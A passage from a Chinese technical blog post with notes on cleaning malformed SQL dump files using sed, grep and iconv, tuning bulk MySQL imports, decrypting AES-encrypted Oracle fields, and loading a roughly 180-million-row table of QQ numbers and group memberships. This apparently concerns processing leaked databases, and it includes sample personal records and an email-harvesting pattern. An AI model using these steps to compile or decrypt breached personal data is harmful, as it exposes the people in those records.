class="line">]);</span><br></pre></td></tr></table></figure><h3 id="反向预查"><a href="#反向预查" class="headerlink" title="反向预查"></a>反向预查</h3><p>这个思维是相反的，比如<code>Windows(?!2000|XP|7)</code>不能匹配Windows7、Windows2000、WindowsXP里的Windows，却能匹配Windows2008里的Windows，例子就不做了，关键符号就是<code>?!</code></p><h2 id="0x02-字符处理"><a href="#0x02-字符处理" class="headerlink" title="0x02 字符处理"></a>0x02 字符处理</h2><h3 id="编码转换"><a href="#编码转换" class="headerlink" title="编码转换"></a>编码转换</h3><blockquote><p>编码不正确会导致 各种莫名奇妙的问题 乱码 甚至 编辑的时候卡住 或 报错<br>所有第一步就是要将转换编码</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">enca -L zh_CN.UTF-8 baidu.txt  <span class="comment">#查看该文本编码</span></span><br><span class="line">iconv -c -f GB2312 -t utf-8 <span class="comment">#转换方法1</span></span><br><span class="line">enca -L zh_CN.UTF-8 -c  <span class="comment">#方法2 自动转换</span></span><br></pre></td></tr></table></figure><p>当然也可以直接</p><p><code>iconv -c -f ASCII -t ASCII  test.txt</code></p><h3 id="转换成-unix-格式-转换换行符"><a href="#转换成-unix-格式-转换换行符" class="headerlink" title="转换成 unix 格式(转换换行符)"></a>转换成 unix 格式(转换换行符)</h3><p><code>dos2unix</code>  当然也可以用<code>tr</code> ,<code>sed</code></p><p>导入数据报错<code>ERROR 1300 (HY000): Invalid utf8 character string:</code></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SET character_set_client = utf8mb4; </span><br><span class="line">mysql&gt; SET character_set_results = utf8mb4; </span><br><span class="line">mysql&gt; SET character_set_connection = utf8mb4; </span><br><span class="line">mysql&gt; SET character_set_server = utf8mb4;</span><br><span class="line">mysql&gt; SET character_set_database = utf8mb4;</span><br></pre></td></tr></table></figure><h3 id="剔除无效字符及空行"><a href="#剔除无效字符及空行" class="headerlink" title="剔除无效字符及空行"></a>剔除无效字符及空行</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sed -e <span class="string">'s/[\x01-\x19]//g'</span> -e <span class="string">'s/\x00/ /g'</span>  -e <span class="string">'s/[\x1a-\x1f]//g'</span> -e <span class="string">'s/^[ \t]*//'</span> -e <span class="string">'s/[ \t]*$//'</span></span><br></pre></td></tr></table></figure><p>当然也可以使用</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep -a -v <span class="string">'[[:cntrl:]]'</span> <span class="comment">#处理不够干净 还是喜欢用上面的方法</span></span><br></pre></td></tr></table></figure><h3 id="去除重复"><a href="#去除重复" class="headerlink" title="去除重复"></a>去除重复</h3><p><code>sort baidu.log | uniq</code> #测试该方法是我所知的最快的 缺点就是只是按照开头字符排序<br><code>awk &quot;{print length($1),$1}&quot; file.txt | sort -n | awk &quot;{print $2}&quot;</code>  字符串按照长度排序(短-&gt;长)   很慢</p><h3 id="清洗案例"><a href="#清洗案例" class="headerlink" title="清洗案例"></a>清洗案例</h3><blockquote><p>如下数据中<code>152221111null</code> 由于导出数据库时替换问题缺少引号导致无法导入数据库</p></blockquote><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> OT_FORMH <span class="keyword">VALUES</span>(<span class="string">'554354353'</span>, <span class="literal">null</span>, <span class="string">'武汉武昌'</span>, <span class="string">'周杰伦'</span>, <span class="string">'152221111null,</span></span><br><span class="line"><span class="string">'</span><span class="number">666666666666</span><span class="string">', null, '</span>HEHE<span class="string">', null, '</span>hahah<span class="string">', '</span>ddddd<span class="string">', null, null, null);</span></span><br></pre></td></tr></table></figure><p><strong>修复后：</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> OT_FORMH <span class="keyword">VALUES</span>(<span class="string">'554354353'</span>, <span class="literal">null</span>, <span class="string">'武汉武昌'</span>, <span class="string">'周杰伦'</span>, <span class="string">'152221111'</span>,</span><br><span class="line"><span class="string">'666666666666'</span>, <span class="literal">null</span>, <span class="string">'HEHE'</span>, <span class="literal">null</span>, <span class="string">'hahah'</span>, <span class="string">'ddddd'</span>, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br></pre></td></tr></table></figure><p><strong>语句</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sed -i <span class="string">"s/null\([[:alnum:]]\)/\1/"</span> a.txt</span><br></pre></td></tr></table></figure><p><strong>数据</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> OT_FORMH <span class="keyword">VALUES</span>(<span class="string">'54534543535'</span>, <span class="string">'302'</span>, <span class="string">'武汉武昌'</span>, <span class="string">'马培月'</span>, <span class="string">'6757657'</span>, <span class="string">'546565469879'</span>, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>, <span class="string">'fd'</span>, null7657657<span class="string">', null, null);</span></span><br></pre></td></tr></table></figure><p><strong><code>null7657657&#39;</code></strong> 缺少引号,多一个null</p><p><strong>修复语句</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sed -i <span class="string">"s/null\([[:alnum:]]\)/\'\1/"</span> a.txt</span><br></pre></td></tr></table></figure><p><strong>问题数据</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> OT_FORMH <span class="keyword">VALUES</span>(<span class="string">'564654654'</span>, <span class="string">'302'</span>, <span class="string">'武汉华东师范大学,a栋302'</span>, <span class="string">'马晓晓'</span>, <span class="string">'15678123456'</span>, <span class="string">'999999'</span>, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>, <span class="string">'HUAWEI'</span>, <span class="number">543535</span><span class="string">', null, null);</span></span><br></pre></td></tr></table></figure><blockquote><p><strong><code>0937536518&#39;</code></strong> 缺少单引号，<strong>武汉华东师范大学</strong><code>,</code>逗号也需要考虑</p></blockquote><p><strong>修复命令</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat a.txt |sed "s/,\s\([[:digit:]]\&#123;5,\&#125;',\)/ ,'\1/g"</span><br></pre></td></tr></table></figure><p>名字如：<code>Tobey &#39;s</code> 包含单引号造成sql执行错误<br><strong>问题数据</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO OT_FORMH VALUES(&apos;xxxxxxxx&apos;, &apos;807&apos;, &apos;厦门市&apos;, &apos;Tom&apos;s xxxxx&apos;, &apos;777777&apos;, &apos;0694013143&apos;, &apos;xxxxx&apos;, null, null, null, &apos;100050&apos;, &apos;073222138&apos;, null, null);</span><br><span class="line"> INSERT INTO OT_FORMH VALUES(&apos;UEU117022513079&apos;, &apos;106&apos;, &apos;ddddd Ce&apos;Tive&apos;, &apos;林月月&apos;, &apos;09276576510&apos;, &apos;800056033355&apos;, &apos;ddddddd&apos;, null, null, null, &apos;200004&apos;, null, &apos;丹东&apos;, null);</span><br></pre></td></tr></table></figure><p><strong>修复命令</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat f.txt |sed &quot;s/\([^( ]\)&apos;\([[:alpha:]]\)/\1 \2/g&quot;</span><br></pre></td></tr></table></figure><p><strong>涉及知识点:</strong></p><blockquote><p><code>&amp;</code> 元字符是有用的，但更有用的功能是能够在正则表达式中定义特定区域，通过定义正则表达式的特定的一部分，您可以引用字符引用这部分。<br>反向引用时,你必须首先定义一个区域,然后回顾这个区域。定义一个区域是在你感兴趣的区域插入\和括号。你周围的第一区域被通过<code>\1</code>引用,第二个地区用 <code>\2</code>引用，等等。</p></blockquote><blockquote><p>替换所有不包含<code>;</code>符号换行，并重新换行</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat a.txt | sed <span class="string">':a;N;$!ba;s/[\r\n]/ /g'</span> |sed <span class="string">'s/\;/;\r\n/g'</span> &gt;a1.txt</span><br></pre></td></tr></table></figure><p><strong>剔除多余的单引号</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cat ff.txt</span><br><span class="line">INSERT INTO CU_AAA VALUES(&apos;5345435&apos;, &apos;65467457&apos;);</span><br><span class="line">INSERT INTO CU_AAA VALUES(&apos;5435435&apos;, &apos;&apos;6546543&apos;);</span><br><span class="line">INSERT INTO CU_AAA VALUES(&apos;5354354&apos;, &apos;5345345&apos;);</span><br><span class="line">INSERT INTO CU_AAA VALUES(&apos;543543543&apos;, &apos;&apos;);</span><br><span class="line">INSERT INTO CU_AAA VALUES(&apos;&apos;, &apos;5435435&apos;);</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat tel1.txt|sed <span class="string">'/\'</span>\<span class="string">')/!s/\'</span>\<span class="string">'/\'</span>/g<span class="string">' &gt;tel2.txt</span></span><br></pre></td></tr></table></figure><p><strong>剔除无意义字符</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sed -e <span class="string">'s/[^[:print:]]//g'</span> -e <span class="string">'s/\xef//g'</span> -e <span class="string">'s/\xbf//g'</span> -e <span class="string">'s/\xbd//g'</span></span><br></pre></td></tr></table></figure><h2 id="导入数据库"><a href="#导入数据库" class="headerlink" title="导入数据库"></a>导入数据库</h2><p><code>mysql -uroot -proot -Ddddd --default_character_set utf8 &lt;sql.txt</code></p><h3 id="常见grep匹配"><a href="#常见grep匹配" class="headerlink" title="常见grep匹配"></a>常见grep匹配</h3><p>查找email</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep -b -a -E -o <span class="string">"\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]&#123;2,6&#125;\b"</span></span><br></pre></td></tr></table></figure><p>匹配 <code>&lt;h1 class=&quot;page-title&quot;&gt;</code>之间字符</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep -oP <span class="string">'(?&lt;=&lt;h1 class="page-title"&gt;).*?(?=&lt;\/h1&gt;)'</span></span><br></pre></td></tr></table></figure><h2 id="0x04-oracle-aes解密"><a href="#0x04-oracle-aes解密" class="headerlink" title="0x04 oracle aes解密"></a>0x04 oracle aes解密</h2><h4 id="使用mysql"><a href="#使用mysql" class="headerlink" title="使用mysql"></a>使用mysql</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 解密</span></span><br><span class="line"><span class="keyword">SET</span> block_encryption_mode = <span class="string">'aes-256-cbc'</span>;</span><br><span class="line"><span class="keyword">SET</span> @init_vector = <span class="keyword">UNHEX</span>(<span class="string">'00000000000000000000000000000000'</span>);</span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">AES_DECRYPT</span>(<span class="keyword">unhex</span>(<span class="string">'39B84FD13BF16DC7813CGB3D4A113685'</span>),<span class="keyword">upper</span>(<span class="keyword">md5</span>(<span class="string">'key-text'</span>)),@init_vector);</span><br><span class="line"><span class="comment">##或直接key</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">AES_DECRYPT</span>(<span class="keyword">unhex</span>(<span class="string">'39B84FD13BF16DC7813CGB3D4A113685'</span>),<span class="string">'KEY0000000000000'</span>,@init_vector);</span><br><span class="line"></span><br><span class="line"><span class="comment">##加密</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">HEX</span>(<span class="keyword">AES_ENCRYPT</span>(<span class="string">'54353453453'</span>, <span class="string">'KEY'</span>, @init_vector));</span><br></pre></td></tr></table></figure><h4 id="使用php"><a href="#使用php" class="headerlink" title="使用php"></a>使用php</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encryptNew</span><span class="params">($str, $key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> bin2hex(openssl_encrypt($str, <span class="string">'AES-256-ECB'</span>, $key, OPENSSL_RAW_DATA));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decryptNew</span><span class="params">($encryptedStr, $key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> openssl_decrypt(hex2bin($encryptedStr), <span class="string">'AES-256-ECB'</span>, $key, OPENSSL_RAW_DATA);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x05-其他导库笔记"><a href="#0x05-其他导库笔记" class="headerlink" title="0x05 其他导库笔记"></a>0x05 其他导库笔记</h2><p>快速显示某一行：<br><code>cat sql.txt | head -n 981 | tail -n +981</code><br><code>sed -n &#39;5243,5245p&#39;</code></p><h3 id="mysql-相关"><a href="#mysql-相关" class="headerlink" title="mysql 相关"></a>mysql 相关</h3><p><strong><em>mysql导入大数据处理</em></strong><br><code>set global slave_net_timeout=3600;</code><br><code>SET GLOBAL max_allowed_packet=1073741824;select @@max_allowed_packet</code></p><p><strong>快速导库</strong></p><blockquote><p>先导库后创索引要快得多<br>load data infile 很快</p></blockquote><p><code>load data infile &#39;/var/lib/mysql-files/CU_AAA.txt&#39; IGNORE into table CUST_TEL fields terminated by &#39;&lt;terminated&gt;&#39;;</code></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span>  <span class="keyword">TABLE</span> <span class="string">`qqinfo`</span>.<span class="string">`qqinfo`</span> (</span><br><span class="line">  <span class="string">`ID`</span> <span class="built_in">INT</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> ,</span><br><span class="line">  <span class="string">`QQNum`</span> <span class="built_in">INT</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> ,</span><br><span class="line">  <span class="string">`Nick`</span> <span class="built_in">VARCHAR</span>(<span class="number">20</span>) <span class="literal">NULL</span> ,</span><br><span class="line">  <span class="string">`QunNum`</span> <span class="built_in">VARCHAR</span>(<span class="number">45</span>) <span class="literal">NULL</span> ,</span><br><span class="line">  PRIMARY <span class="keyword">KEY</span> (<span class="string">`ID`</span>) )</span><br><span class="line"><span class="keyword">ENGINE</span> = MyISAM</span><br><span class="line"><span class="keyword">DEFAULT</span> <span class="built_in">CHARACTER</span> <span class="keyword">SET</span> = utf8</span><br><span class="line"><span class="keyword">COLLATE</span> = utf8_general_ci;</span><br><span class="line"></span><br><span class="line"><span class="comment">##修改字段编码</span></span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> <span class="string">`qqinfo`</span>  <span class="keyword">CHANGE</span> <span class="string">`Nick`</span>  <span class="string">`Nick`</span> <span class="built_in">VARCHAR</span>(<span class="number">45</span>)  <span class="built_in">CHARACTER</span> <span class="keyword">SET</span> utf8 <span class="keyword">COLLATE</span> utf8_bin</span><br><span class="line"></span><br><span class="line"><span class="keyword">load</span> <span class="keyword">data</span> <span class="keyword">infile</span> <span class="string">'H:\\mysql\\sql.txt'</span> <span class="keyword">into</span> <span class="keyword">table</span> qqinfo <span class="keyword">fields</span> <span class="keyword">terminated</span> <span class="keyword">by</span> <span class="string">':'</span> (<span class="keyword">ID</span>,QQNum,Nick,QunNum);</span><br><span class="line"></span><br><span class="line"><span class="comment">##设置 所有编码 </span></span><br><span class="line"><span class="keyword">set</span> <span class="keyword">names</span> utf8;</span><br><span class="line"><span class="comment">##查看编码</span></span><br><span class="line"><span class="keyword">show</span> <span class="keyword">variables</span> <span class="keyword">like</span> <span class="string">'character%'</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">##修改数据库编码</span></span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">database</span> <span class="string">`qqinfo`</span> <span class="keyword">DEFAULT</span> <span class="built_in">CHARACTER</span> <span class="keyword">SET</span> utf8 <span class="keyword">COLLATE</span> utf8_bin</span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">database</span> <span class="string">`qqinfo`</span> <span class="keyword">DEFAULT</span> <span class="built_in">CHARACTER</span> <span class="keyword">SET</span> gbk <span class="keyword">COLLATE</span> gbk_chinese_ci</span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">DATABASE</span> <span class="string">`db_name`</span> <span class="keyword">DEFAULT</span> <span class="built_in">CHARACTER</span> <span class="keyword">SET</span> utf8 <span class="keyword">COLLATE</span> utf8_general_ci;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">##修改表编码</span></span><br><span class="line"><span class="keyword">use</span> qqinfo;</span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> <span class="string">`qqinfo`</span> <span class="keyword">default</span> <span class="built_in">character</span> <span class="keyword">set</span> utf8 <span class="keyword">collate</span> utf8_bin;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">##注：1.UTF8不要导入gbk，gbk不要导入UTF8;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">##都在界面下设置好</span></span><br><span class="line"></span><br><span class="line">1 hour 26 min 38.72 sec</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">INDEX</span> ix_QQNum <span class="keyword">ON</span> qqinfo (QQNum) 创建索引</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`qqinfo`</span> (</span><br><span class="line">  <span class="string">`ID`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">  <span class="string">`QQNum`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">  <span class="string">`Nick`</span> <span class="built_in">char</span>(<span class="number">12</span>)  <span class="keyword">DEFAULT</span> <span class="literal">NULL</span>,</span><br><span class="line">  <span class="string">`QunNum`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">DEFAULT</span> <span class="literal">NULL</span>,</span><br><span class="line">  PRIMARY <span class="keyword">KEY</span> (<span class="string">`ID`</span>)</span><br><span class="line">) <span class="keyword">ENGINE</span>=MyISAM <span class="keyword">DEFAULT</span> <span class="keyword">CHARSET</span>=gb2312;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">INDEX</span> idx_qqinfo <span class="keyword">ON</span> qqinfo (QQNum,QunNum);</span><br><span class="line"></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> qqinfo <span class="keyword">ADD</span> <span class="keyword">INDEX</span> index_qqinfo_QQNum_QunNum (QQNum,QunNum);</span><br><span class="line"></span><br><span class="line"><span class="keyword">set</span> <span class="keyword">GLOBAL</span> innodb_flush_log_at_trx_commit = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">##先建索引，再执行set GLOBAL innodb_flush_log_at_trx_commit = 0;再倒入数据；</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">innodb_flush_log_at_trx_commit</span><br><span class="line"></span><br><span class="line">innodb_buffer_pool_size</span><br><span class="line">如果用<span class="keyword">Innodb</span>，那么这是一个重要变量。相对于MyISAM来说，<span class="keyword">Innodb</span>对于buffer <span class="keyword">size</span>更敏感。MySIAM可能对于大数据量使用默认的key_buffer_size也还好，但<span class="keyword">Innodb</span>在大数据量时用默认值就感觉在爬了。 <span class="keyword">Innodb</span>的缓冲池会缓存数据和索引，所以不需要给系统的缓存留空间，如果只用<span class="keyword">Innodb</span>，可以把这个值设为内存的<span class="number">70</span>%<span class="number">-80</span>%。和 key_buffer相同，如果数据量比较小也不怎么增加，那么不要把这个值设太高也可以提高内存的使用率。</span><br><span class="line"></span><br><span class="line">innodb_additional_pool_size </span><br><span class="line">这个的效果不是很明显，至少是当操作系统能合理分配内存时。但你可能仍需要设成<span class="number">20</span>M或更多一点以看<span class="keyword">Innodb</span>会分配多少内存做其他用途。</span><br><span class="line"></span><br><span class="line">innodb_log_file_size</span><br><span class="line">对于写很多尤其是大数据量时非常重要。要注意，大的文件提供更高的性能，但数据库恢复时会用更多的时间。我一般用<span class="number">64</span>M<span class="number">-512</span>M，具体取决于服务器的空间。</span><br><span class="line"></span><br><span class="line">innodb_log_buffer_size </span><br><span class="line">默认值对于多数中等写操作和事务短的运用都是可以的。如 果经常做更新或者使用了很多<span class="built_in">blob</span>数据，应该增大这个值。但太大了也是浪费内存，因为<span class="number">1</span>秒钟总会 <span class="keyword">flush</span>（这个词的中文怎么说呢？）一次，所以不需要设到超过<span class="number">1</span>秒的需求。<span class="number">8</span>M<span class="number">-16</span>M一般应该够了。小的运用可以设更小一点。</span><br><span class="line"></span><br><span class="line">innodb_flush_log_at_trx_commit  （这个很管用） </span><br><span class="line">抱怨<span class="keyword">Innodb</span>比MyISAM慢 </span><br><span class="line"><span class="number">100</span>倍？那么你大概是忘了调整这个值。默认值<span class="number">1</span>的意思是每一次事务提交或事务外的指令都需要把日志写入（<span class="keyword">flush</span>）硬盘，这是很费时的。特别是使用电 </span><br><span class="line">池供电缓存（Battery backed up </span><br><span class="line"><span class="keyword">cache</span>）时。设成<span class="number">2</span>对于很多运用，特别是从MyISAM表转过来的是可以的，它的意思是不写入硬盘而是写入系统缓存。日志仍然会每秒<span class="keyword">flush</span>到硬 </span><br><span class="line">盘，所以你一般不会丢失超过<span class="number">1</span><span class="number">-2</span>秒的更新。设成<span class="number">0</span>会更快一点，但安全方面比较差，即使MySQL挂了也可能会丢失事务的数据。而值<span class="number">2</span>只会在整个操作系统 </span><br><span class="line">挂了时才可能丢数据。 </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">每个MyISAM在磁盘上存储成三个文件。第一个文件的名字以表的名字开始，扩展名指出文件类型。.frm文件存储表定义。数据文件的扩展名为.MYD (MYData)。索引文件的扩展名是.MYI (MYIndex)。</span><br><span class="line"></span><br><span class="line">mysql 状态</span><br><span class="line"><span class="keyword">SHOW</span> <span class="keyword">STATUS</span> <span class="keyword">like</span> <span class="string">'_cache%'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mysql&gt; <span class="keyword">show</span> <span class="keyword">variables</span> <span class="keyword">like</span> <span class="string">'%tmp%'</span>;</span><br><span class="line">+<span class="comment">----------------------------+-------------------------------------------------+</span></span><br><span class="line">| Variable_name              | Value                                           |</span><br><span class="line">+<span class="comment">----------------------------+-------------------------------------------------+</span></span><br><span class="line">| default_tmp_storage_engine | InnoDB                                          |</span><br><span class="line">| max_tmp_tables             | 32                                              |</span><br><span class="line">| slave_load_tmpdir          | C:\Windows\SERVIC~2\NETWOR~1\AppData\Local\Temp |</span><br><span class="line">| tmp_table_size             | 57671680                                        |</span><br><span class="line">| tmpdir                     | C:\Windows\SERVIC~2\NETWOR~1\AppData\Local\Temp |</span><br><span class="line">+<span class="comment">----------------------------+-------------------------------------------------+</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> <span class="keyword">show</span> <span class="keyword">global</span> <span class="keyword">status</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> 优化相关</span><br><span class="line"> </span><br><span class="line"> <span class="keyword">http</span>://wenku.baidu.com/<span class="keyword">link</span>?<span class="keyword">url</span>=wPDRuX34e7Z8o-JJG5BT7Tu1gq43c5ZS2X8_2IRnlSrniYUTxMsPk_Hz8Pqw3FxFE0v3tiKO-Sr_Jumn6bZAIYbZMWo5BAFg9rJkJEfD75e</span><br><span class="line"> <span class="keyword">http</span>://blog.chinaunix.net/uid<span class="number">-24145780</span>-<span class="keyword">id</span><span class="number">-125159.</span>html</span><br><span class="line"> </span><br><span class="line"> 复制表</span><br><span class="line"> </span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`qqinfo_1`</span> (</span><br><span class="line">  <span class="string">`ID`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> AUTO_INCREMENT,</span><br><span class="line">  <span class="string">`QQNum`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">  <span class="string">`Nick`</span> <span class="built_in">char</span>(<span class="number">20</span>) <span class="keyword">DEFAULT</span> <span class="literal">NULL</span>,</span><br><span class="line">  <span class="string">`QunNum`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">DEFAULT</span> <span class="literal">NULL</span>,</span><br><span class="line">  PRIMARY <span class="keyword">KEY</span> (<span class="string">`ID`</span>),</span><br><span class="line">  <span class="keyword">KEY</span> <span class="string">`inx_qqinfo`</span> (<span class="string">`QQNum`</span>,<span class="string">`QunNum`</span>) <span class="keyword">USING</span> <span class="keyword">HASH</span></span><br><span class="line">) <span class="keyword">ENGINE</span>=MyISAM AUTO_INCREMENT=<span class="number">179780305</span> <span 